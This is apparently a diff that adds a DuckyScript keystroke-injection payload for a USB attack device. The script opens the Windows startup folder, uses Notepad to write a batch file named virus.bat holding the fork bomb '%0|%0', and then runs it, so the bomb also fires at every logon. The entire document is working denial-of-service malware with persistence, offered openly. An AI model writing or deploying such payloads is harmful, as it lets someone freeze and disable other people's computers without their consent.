@@ -1,0 +1,25 @@
+DELAY 400
+GUI r
+DELAY 100
+
+STRING shell:startup
+SHIFT F10
+STRING w
+ENTER
+
+STRING notepad virus.bat
+ENTER
+DELAY 100
+ENTER
+
+STRING %0|%0
+
+CTRL s
+ALT F4
+
+STRING shell:startup
+SHIFT F10
+STRING w
+ENTER
+virus.bat
+ENTER
